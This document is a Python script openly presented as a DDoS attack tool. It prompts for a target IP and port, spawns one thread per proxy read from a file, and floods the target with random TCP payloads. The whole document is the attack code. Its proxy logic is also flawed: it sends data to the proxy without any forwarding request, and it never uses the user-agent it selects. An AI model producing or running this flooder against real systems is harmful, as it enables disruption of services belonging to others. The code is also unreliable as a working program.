import os
import socket
import threading
import random
import time

def generate_payload():
    payload_size = random.randint(1024, 4096)  
    return ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for _ in range(payload_size)).encode()

def ddos_attack(target_ip, target_port, user_agent, proxy):
    while True:
        try:
            payload = generate_payload()
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if proxy:
                s.settimeout(10)
                s.connect(proxy)
            else:
                s.connect((target_ip, target_port))
            s.send(payload)
            print("\033[92mPayload sent successfully")
            s.close()
        except Exception as e:
            print("\033[91mMaybe the website is down or unable to attack.")
            break

# All user agents
user_agents = [
   "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36",
   "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 UBrowser/7.0.185.1002 Safari/537.36",
   # Add more user agents as needed
]

def read_proxies(filename):
    proxies = []
    try:
        with open(filename, 'r') as file:
            for line in file:
                parts = line.strip().split(':')
                if len(parts) == 2:
                    proxy = (parts[0], int(parts[1]))
                    proxies.append(proxy)
    except FileNotFoundError:
        print(f"File '{filename}' not found.")
    return proxies

target_ip = input("Enter target IP address: ")
target_port = int(input("Enter target port: "))

proxies = read_proxies('proxy.txt')
user_agent = random.choice(user_agents)

threads = []
for proxy in proxies:
    thread = threading.Thread(target=ddos_attack, args=(target_ip, target_port, user_agent, proxy))
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()

os.system('cls' if os.name == 'nt' else 'clear')
